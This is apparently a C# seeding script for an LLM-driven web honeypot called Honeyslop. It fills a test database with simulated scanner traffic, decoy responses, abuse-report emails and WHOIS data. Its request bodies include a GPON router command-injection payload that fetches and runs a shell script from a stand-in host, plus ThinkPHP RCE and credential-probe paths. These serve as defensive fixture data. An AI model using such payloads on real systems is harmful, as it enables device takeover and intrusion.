#:project ../../../lib/Honeyslop.Data/Honeyslop.Data.csproj
#:property PublishAot=false

using System.Globalization;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Honeyslop.Data;
using Honeyslop.Data.Entities;
using Honeyslop.Data.Enums;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

var connectionString = args.FirstOrDefault() ??
                       throw new ArgumentException("Pass the connection string of the database to seed.");
var now = args.Length > 1
    ? DateTimeOffset.Parse(args[1], CultureInfo.InvariantCulture)
    : DateTimeOffset.UtcNow;

await using var services = new ServiceCollection()
    .AddDbContext<ApplicationDbContext>(x => x.UseNpgsql(connectionString))
    .BuildServiceProvider();
await using var scope = services.CreateAsyncScope();
var db = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();

if (await db.Requests.AnyAsync() || await db.Entries.AnyAsync())
    throw new InvalidOperationException("The database already holds data; seed an empty one.");

var origin = new DateTimeOffset(2026, 11, 10, 12, 0, 0, TimeSpan.Zero);
var random = new Random(20261110);

string[] hosts = ["example.test", "api.example.test", "mail.example.test", "legacy.example.test"];
var scanners = new Scanner[]
{
    new("176.9.38.39", 70, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ["/wp-login.php", "/xmlrpc.php", "/wp-admin/setup-config.php", "/wp-content/plugins/revslider/temp/update_extract/", "/wp-includes/wlwmanifest.xml", "/?author=1"]),
    new("34.155.127.35", 45, "python-requests/2.31.0",
        ["/.env", "/.git/config", "/.aws/credentials", "/config.json", "/.env.production", "/api/.env"]),
    new("185.220.101.1", 30, null,
        ["/phpmyadmin/", "/pma/", "/mysql/admin/", "/server-status", "/actuator/env", "/actuator/heapdump"]),
    new("2a01:4f8:c17:1a2b::1", 20, "Mozilla/5.0 zgrab/0.x",
        ["/boaform/admin/formLogin", "/cgi-bin/luci/;stok=/locale", "/GponForm/diag_Form?images/", "/HNAP1/"]),
    new("45.95.147.236", 25, "Go-http-client/1.1",
        ["/", "/robots.txt", "/favicon.ico", "/sitemap.xml", "/.well-known/security.txt"]),
    new("5.188.206.14", 15, "curl/8.4.0",
        ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", "/solr/admin/info/system?wt=json"]),
    new("8.8.8.8", 10, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        ["/", "/robots.txt"]),
    new("203.0.113.7", 8, "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ["/admin", "/login", "/api/v1/users?limit=1000&offset=0&include=tokens,sessions,permissions"])
};

var entries = new Dictionary<string, Entry>(StringComparer.Ordinal);
var requests = new List<(Scanner Scanner, RequestRecord Record, string Key)>();
var total = scanners.Sum(x => x.Requests);
var timeline = Enumerable
    .Range(0, total)
    .Select(index => origin.AddMinutes(-(total - index) * 17).AddSeconds(random.Next(0, 59)))
    .ToArray();
var queue = scanners
    .SelectMany(scanner => Enumerable.Range(0, scanner.Requests).Select(index => (Scanner: scanner, Index: index)))
    .OrderBy(_ => random.Next())
    .ToArray();

for (var index = 0; index < queue.Length; index++)
{
    var (scanner, ordinal) = queue[index];
    var target = scanner.Targets[ordinal % scanner.Targets.Length];
    var method = target switch
    {
        "/xmlrpc.php" or "/boaform/admin/formLogin" or "/GponForm/diag_Form?images/" => "POST",
        "/HNAP1/" => ordinal % 2 == 0 ? "GET" : "HEAD",
        _ => "GET"
    };
    var host = hosts[(ordinal + scanner.Ip.Length) % hosts.Length];
    var key = $"{method} {host}{target}";
    var receivedAt = timeline[index];
    var isNew = !entries.ContainsKey(key);
    var outcome = target switch
    {
        "/" or "/robots.txt" or "/favicon.ico" => RequestOutcome.Static,
        _ when index % 41 == 7 => RequestOutcome.Error,
        _ when index % 29 == 3 => RequestOutcome.Abandoned,
        _ when index % 23 == 5 => RequestOutcome.Fallback,
        _ when isNew => RequestOutcome.Generated,
        _ => RequestOutcome.Hit
    };
    if (outcome is RequestOutcome.Generated or RequestOutcome.Hit && isNew)
        entries[key] = NewEntry(method, host, target, scanner, receivedAt);

    requests.Add((scanner, new RequestRecord
    {
        ReceivedAt = receivedAt,
        ClientIp = scanner.Ip,
        Method = method,
        Host = host,
        Target = target,
        UserAgent = scanner.UserAgent ?? (ordinal % 3 == 0 ? null : $"Mozilla/5.0 (rotating; {ordinal % 5})"),
        Headers = JsonSerializer.Serialize(new Dictionary<string, string>
        {
            ["Accept"] = "*/*",
            ["Accept-Encoding"] = "gzip",
            ["Connection"] = "close"
        }),
        Body = method == "POST" ? RequestBody(target, ordinal) : null,
        Outcome = outcome,
        ResponseStatus = outcome switch
        {
            RequestOutcome.Static => 200,
            RequestOutcome.Error => 502,
            RequestOutcome.Abandoned => 499,
            RequestOutcome.Fallback => 404,
            _ => target.EndsWith(".env", StringComparison.Ordinal) ? 200 : 200 + (ordinal % 2) * 3
        },
        DurationMs = outcome switch
        {
            RequestOutcome.Generated => 4000 + random.Next(0, 9000),
            RequestOutcome.Abandoned => 30000,
            _ => 3 + random.Next(0, 40)
        },
        Instance = $"honeyslop-trap-{ordinal % 2}"
    }, key));
}

var states = entries.Values.OrderBy(x => x.CreatedAt).ToArray();
for (var index = 0; index < states.Length; index++)
{
    var entry = states[index];
    switch (index % 9)
    {
        case 2 when index < 20:
            entry.Status = EntryStatus.Failed;
            entry.Error = "The generator answered 500: context length exceeded";
            entry.Attempts = 3;
            entry.ResponseStatus = null;
            entry.ResponseBody = null;
            entry.ResponseHeaders = [];
            break;
        case 5 when index < 30:
            entry.Status = EntryStatus.Expired;
            entry.UpdatedAt = origin.AddHours(-2);
            break;
    }
}

var queued = new[] { "/ecp/Current/exporttool/microsoft.exchange.ediscoveryexporttool.application", "/owa/auth/x.js" }
    .Select((target, index) => new Entry
    {
        KeyHash = Hash($"GET mail.example.test{target}"),
        Method = "GET",
        Host = "mail.example.test",
        Target = target,
        Status = EntryStatus.Pending,
        ClientIp = "185.220.101.1",
        UserAgent = "Mozilla/5.0",
        CreatedAt = origin.AddMinutes(-30 + index * 7),
        UpdatedAt = origin.AddMinutes(-30 + index * 7),
        RequestedAt = origin.AddMinutes(-5)
    });
var generating = new Entry
{
    KeyHash = Hash("GET api.example.test/api/v2/graphql"),
    Method = "GET",
    Host = "api.example.test",
    Target = "/api/v2/graphql",
    Status = EntryStatus.Pending,
    ClaimedBy = "honeyslop-trap-1",
    ClaimedAt = origin.AddMinutes(-1),
    Generator = "gpu-b",
    Attempts = 1,
    ClientIp = "34.155.127.35",
    UserAgent = "python-requests/2.31.0",
    CreatedAt = origin.AddMinutes(-2),
    UpdatedAt = origin.AddMinutes(-1)
};
var replacement = states.First(x => x.Status == EntryStatus.Expired);
var current = NewEntry(replacement.Method, replacement.Host, replacement.Target, scanners[0], origin.AddHours(-1));
current.Hits = 4;

var recent = new[] { ("gpu-a", 3100, 412), ("gpu-a", 5200, 655), ("gpu-b", 8900, 1203), ("gpu-b", 7400, 980), ("gpu-b", 6100, 801) }
    .Select((x, index) => new Entry
    {
        KeyHash = Hash($"GET legacy.example.test/recent/{index}"),
        Method = "GET",
        Host = "legacy.example.test",
        Target = $"/old/backup-{2019 + index}.zip",
        Status = EntryStatus.Ready,
        ResponseStatus = 404,
        ResponseHeaders = [new ResponseHeader { Name = "Content-Type", Value = "text/plain; charset=utf-8" }],
        ResponseBody = "Not Found",
        Model = "qwen3-30b-a3b",
        Generator = x.Item1,
        GenerationMs = x.Item2,
        PromptTokens = 900,
        CompletionTokens = x.Item3,
        CreatedAt = origin.AddDays(-3).AddMinutes(index),
        UpdatedAt = origin.AddDays(-3).AddMinutes(index),
        GeneratedAt = now.AddHours(-1 - index)
    });

db.Entries.AddRange(states);
db.Entries.AddRange(queued);
db.Entries.Add(generating);
db.Entries.Add(current);
db.Entries.AddRange(recent);
await db.SaveChangesAsync();

foreach (var (_, record, key) in requests)
{
    if (record.Outcome is RequestOutcome.Hit or RequestOutcome.Generated && entries.TryGetValue(key, out var entry))
    {
        record.EntryId = entry.Id;
        entry.Hits++;
        entry.LastHitAt = record.ReceivedAt;
    }
}

db.Requests.AddRange(requests.Select(x => x.Record));
await db.SaveChangesAsync();

RequestRecord[] From(string ip) => [.. requests.Where(x => x.Scanner.Ip == ip).Select(x => x.Record).OrderBy(x => x.Id)];

var reported = From("176.9.38.39");
var lastReported = reported[^13];
db.AbuseReports.AddRange(
    new AbuseReport
    {
        ClientIp = "176.9.38.39",
        Recipients = ["abuse@hetzner.example.test"],
        Subject = "HTTP scanning from 176.9.38.39",
        Body = Letter("176.9.38.39", [.. reported.TakeWhile(x => x.Id <= lastReported.Id)]),
        RequestedBy = "operator",
        SenderName = "Example Operator",
        Status = AbuseReportStatus.Sent,
        Attempts = 1,
        AttachedRequests = reported.Count(x => x.Id <= lastReported.Id),
        LastRequestId = lastReported.Id,
        MessageId = "<report-1.20261109083000.3fa9c1@example.test>",
        SentFrom = "\"Example Operator\" <security@example.test>",
        CreatedAt = lastReported.ReceivedAt.AddMinutes(4),
        UpdatedAt = lastReported.ReceivedAt.AddMinutes(5),
        SentAt = lastReported.ReceivedAt.AddMinutes(5)
    },
    new AbuseReport
    {
        ClientIp = "185.220.101.1",
        Recipients = ["abuse@tor.example.test"],
        Subject = "HTTP scanning from 185.220.101.1",
        Body = Letter("185.220.101.1", From("185.220.101.1")),
        RequestedBy = "operator",
        SenderName = "Example Operator",
        Status = AbuseReportStatus.Failed,
        Attempts = 1,
        Error = "SmtpCommandException: 550 5.1.1 <abuse@tor.example.test>: Recipient address rejected: User unknown in virtual mailbox table",
        CreatedAt = origin.AddHours(-20),
        UpdatedAt = origin.AddHours(-20).AddSeconds(3)
    },
    new AbuseReport
    {
        ClientIp = "203.0.113.7",
        Recipients = ["abuse@test-net.example.test", "noc@test-net.example.test"],
        Subject = "HTTP scanning from 203.0.113.7",
        Body = Letter("203.0.113.7", From("203.0.113.7")),
        RequestedBy = "operator",
        SenderName = null,
        Status = AbuseReportStatus.Pending,
        Attempts = 2,
        RetryAt = origin.AddHours(1),
        Error = "SmtpCommandException: 421 4.7.0 Try again later, closing connection",
        CreatedAt = origin.AddMinutes(-40),
        UpdatedAt = origin.AddMinutes(-35)
    },
    new AbuseReport
    {
        ClientIp = "2a01:4f8:c17:1a2b::1",
        Recipients = ["abuse@hetzner.example.test"],
        Subject = "HTTP scanning from 2a01:4f8:c17:1a2b::1",
        Body = Letter("2a01:4f8:c17:1a2b::1", From("2a01:4f8:c17:1a2b::1")),
        RequestedBy = "operator",
        SenderName = "Example Operator",
        Status = AbuseReportStatus.Pending,
        Attempts = 0,
        CreatedAt = origin.AddMinutes(-3),
        UpdatedAt = origin.AddMinutes(-3)
    });

db.ClientWhois.AddRange(scanners.Select(x => new ClientWhois
{
    ClientIp = x.Ip,
    Info = Whois(x.Ip),
    UpdatedAt = new DateTimeOffset(2099, 1, 1, 0, 0, 0, TimeSpan.Zero)
}));
db.Settings.AddRange(
    new Setting { Key = "public_view", Value = "True", UpdatedAt = origin },
    new Setting { Key = "request_retention_seconds", Value = "0", UpdatedAt = origin });
db.UserSettings.Add(new UserSetting { UserId = "operator", Key = "sender_name", Value = "Example Operator", UpdatedAt = origin });
await db.SaveChangesAsync();

Console.WriteLine($"Seeded {entries.Count + 9} entries, {requests.Count} requests, 4 abuse reports and {scanners.Length} WHOIS records.");
return;

Entry NewEntry(string method, string host, string target, Scanner scanner, DateTimeOffset createdAt)
{
    var html = target.EndsWith(".php", StringComparison.Ordinal) || target.EndsWith('/');
    var json = target.Contains("json", StringComparison.Ordinal) || target.StartsWith("/api", StringComparison.Ordinal);
    var body = html
        ? $"<!DOCTYPE html><html><head><title>{host}</title></head><body><h1>Welcome to {host}</h1><form method=\"post\"><input name=\"log\"><input type=\"password\" name=\"pwd\"><button>Log in</button></form></body></html>"
        : json
            ? JsonSerializer.Serialize(new { status = "ok", version = "4.2.1", items = new[] { new { id = 1, name = "admin" } } })
            : $"APP_ENV=production\nAPP_KEY=base64:{Convert.ToBase64String(Hash(target)[..18])}\nDB_HOST=10.0.0.12\nDB_PASSWORD=hunter2\n";
    var contentType = html ? "text/html; charset=utf-8" : json ? "application/json" : "text/plain; charset=utf-8";
    return new Entry
    {
        KeyHash = Hash($"{method} {host}{target}"),
        Method = method,
        Host = host,
        Target = target,
        Status = EntryStatus.Ready,
        Attempts = 1,
        ClientIp = scanner.Ip,
        UserAgent = scanner.UserAgent,
        RequestHeaders = "Accept: */*",
        ResponseStatus = 200,
        ResponseHeaders =
        [
            new ResponseHeader { Name = "Content-Type", Value = contentType },
            new ResponseHeader { Name = "Server", Value = "nginx/1.18.0 (Ubuntu)" }
        ],
        ResponseBody = body,
        Model = "qwen3-30b-a3b",
        Generator = body.Length % 2 == 0 ? "gpu-a" : "gpu-b",
        PromptTokens = 850 + body.Length % 200,
        CompletionTokens = 120 + body.Length / 4,
        GenerationMs = 2500 + body.Length * 11,
        CreatedAt = createdAt,
        UpdatedAt = createdAt.AddSeconds(9),
        GeneratedAt = createdAt.AddSeconds(9)
    };
}

static string RequestBody(string target, int ordinal)
{
    return target switch
    {
        "/xmlrpc.php" => $"<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password{ordinal}</value></param></params></methodCall>",
        "/boaform/admin/formLogin" => $"username=admin&psd=Feefifofum{ordinal % 4}",
        _ => "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://198.51.100.9/x.sh+-O+-|sh`&ipv=0"
    };
}

static string Letter(string ip, RequestRecord[] records)
{
    var builder = new StringBuilder()
        .Append("Hello,\n\n")
        .Append(CultureInfo.InvariantCulture, $"{ip} sent {records.Length} HTTP requests to host names we operate. ")
        .Append("None of these paths exist on our servers; the pattern matches automated vulnerability scanning.\n\n");
    foreach (var record in records.TakeLast(5))
        builder.Append(CultureInfo.InvariantCulture, $"{record.ReceivedAt.UtcDateTime:yyyy-MM-dd HH:mm:ss}  {record.Method} {record.Host}{record.Target}\n");
    return builder.Append("\nPlease look into this and stop the traffic from this address.\n").ToString();
}

static string Whois(string ip)
{
    var (prefix, asn, holder, owner, country, registry, contacts) = ip switch
    {
        "176.9.38.39" => ("176.9.0.0/16", 24940L, "HETZNER-AS", "Hetzner Online GmbH", "DE", "ripe", new[] { "abuse@hetzner.example.test" }),
        "34.155.127.35" => ("34.155.0.0/16", 396982L, "GOOGLE-CLOUD-PLATFORM", "Google LLC", "US", "arin", ["google-cloud-compliance@example.test"]),
        "185.220.101.1" => ("185.220.101.0/24", 208294L, "CIA-TRIAD-SEC-AS", "Relay operators", "DE", "ripe", ["abuse@tor.example.test"]),
        "2a01:4f8:c17:1a2b::1" => ("2a01:4f8::/32", 24940L, "HETZNER-AS", "Hetzner Online GmbH", "DE", "ripe", ["abuse@hetzner.example.test"]),
        "45.95.147.236" => ("45.95.147.0/24", 49870L, "ALSYCON", "Alsycon B.V.", "NL", "ripe", ["abuse@alsycon.example.test"]),
        "5.188.206.14" => ("5.188.206.0/24", 49453L, "GLOBALLAYER", "Global Layer B.V.", "NL", "ripe", ["abuse@globallayer.example.test"]),
        "8.8.8.8" => ("8.8.8.0/24", 15169L, "GOOGLE", "Google LLC", "US", "arin", []),
        _ => ("203.0.113.0/24", 64500L, "TEST-NET-3", "Documentation range", "ZZ", "iana", ["abuse@test-net.example.test", "noc@test-net.example.test"])
    };
    return JsonSerializer.Serialize(new
    {
        Prefix = prefix,
        Origins = new[] { new { Asn = asn, Holder = holder } },
        Network = prefix,
        NetworkName = holder,
        Owner = owner,
        Country = country,
        Registry = registry,
        AbuseContacts = contacts,
        Records = $"inetnum:        {prefix}\nnetname:        {holder}\norg-name:       {owner}\ncountry:        {country}\nabuse-mailbox:  {string.Join(", ", contacts)}\nsource:         {registry.ToUpperInvariant()}\n",
        LookedUpAt = new DateTimeOffset(2026, 11, 9, 6, 0, 0, TimeSpan.Zero)
    });
}

static byte[] Hash(string value)
{
    return SHA256.HashData(Encoding.UTF8.GetBytes(value));
}

internal sealed record Scanner(string Ip, int Requests, string? UserAgent, string[] Targets);
